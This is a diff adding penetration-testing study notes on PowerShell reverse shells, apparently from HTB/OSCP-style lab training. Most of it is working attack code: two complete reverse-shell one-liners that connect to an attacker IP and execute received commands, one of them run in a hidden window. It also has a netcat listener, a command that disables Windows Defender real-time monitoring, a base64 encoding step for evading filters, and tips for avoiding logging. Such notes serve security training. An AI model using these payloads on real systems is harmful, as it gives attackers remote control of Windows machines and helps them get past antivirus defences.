@@ -1,0 +1,245 @@
+# Reverse Shells (PowerShell)
+
+## Overview
+
+PowerShell can be used to establish a **reverse shell** from a Windows target back to the attacker machine.
+
+Advantages:
+
+- native to Windows
+- commonly allowed outbound
+- flexible execution options
+- works without uploading binaries
+
+---
+
+# Attack Flow
+
+1. Start listener on attack box
+2. Execute PowerShell reverse shell on target
+3. Catch connection
+4. interact with system
+
+---
+
+# 1. Start Listener (Attack Box)
+
+```bash
+sudo nc -lvnp 443
+```
+
+Example:
+
+```text
+Listening on 0.0.0.0 443
+```
+
+---
+
+# 2. PowerShell Reverse Shell Payload (Target)
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+---
+
+# 3. Successful Connection
+
+Listener output:
+
+```text
+Connection received on 10.129.36.68 49674
+```
+
+Interactive shell:
+
+```powershell
+PS C:\Users\htb-student> whoami
+ws01\htb-student
+```
+
+---
+
+# Command Breakdown
+
+| Component | Purpose |
+|----------|--------|
+| powershell | launches PowerShell |
+| -nop | no profile (faster, less logging) |
+| TCPClient | connects to attacker |
+| GetStream() | establishes communication channel |
+| iex | executes received commands |
+| Out-String | returns command output |
+| stream.Write | sends output back |
+| loop | maintains persistent shell |
+
+---
+
+# AV Blocking Behaviour
+
+Windows Defender may detect the payload:
+
+```text
+This script contains malicious content and has been blocked by your antivirus software.
+```
+
+---
+
+# Disable Defender (Lab Only)
+
+Administrative PowerShell required:
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Verify:
+
+```powershell
+Get-MpPreference | select DisableRealtimeMonitoring
+```
+
+---
+
+# Common Variations
+
+## Shortened PowerShell Reverse Shell
+
+```powershell
+powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"
+```
+
+---
+
+## Encoded Command Format
+
+Useful when dealing with filtering:
+
+```powershell
+powershell -enc <base64>
+```
+
+Generate encoded payload:
+
+```bash
+echo -n '<powershell command>' | iconv -t UTF-16LE | base64 -w 0
+```
+
+---
+
+# Useful Post-Shell Commands
+
+```powershell
+whoami
+hostname
+ipconfig
+pwd
+dir
+systeminfo
+net user
+net localgroup administrators
+```
+
+---
+
+# Troubleshooting
+
+## No connection received
+
+Check:
+
+- correct IP address
+- correct port
+- firewall blocking outbound
+- listener running
+- AV blocking execution
+
+---
+
+## Connection drops immediately
+
+Possible causes:
+
+- unstable shell
+- AV detection
+- incorrect syntax
+- outbound filtering
+
+Try alternate port:
+
+```bash
+443
+53
+80
+8080
+8443
+```
+
+---
+
+# OPSEC Considerations
+
+PowerShell activity may be logged:
+
+- Script Block Logging
+- AMSI scanning
+- Defender signatures
+- EDR telemetry
+
+Safer approach:
+
+- obtain shell
+- migrate to more stable access method
+- remove payload artefacts if required by scope
+
+---
+
+# Cheatsheet
+
+## listener
+
+```bash
+sudo nc -lvnp 443
+```
+
+---
+
+## reverse shell
+
+```powershell
+powershell -nop -c "<payload>"
+```
+
+---
+
+## disable defender (lab only)
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+---
+
+## encode command
+
+```bash
+echo -n 'COMMAND' | iconv -t UTF-16LE | base64 -w 0
+```
+
+---
+
+# Related Notes
+
+- msfvenom payloads
+- interactive shells
+- netcat shells
+- AMSI bypass
+- AV evasion
+- Windows privilege escalation
+
+---
+
+# Tags
+
+#powershell #reverse-shell #windows #shell #oscp #payloads
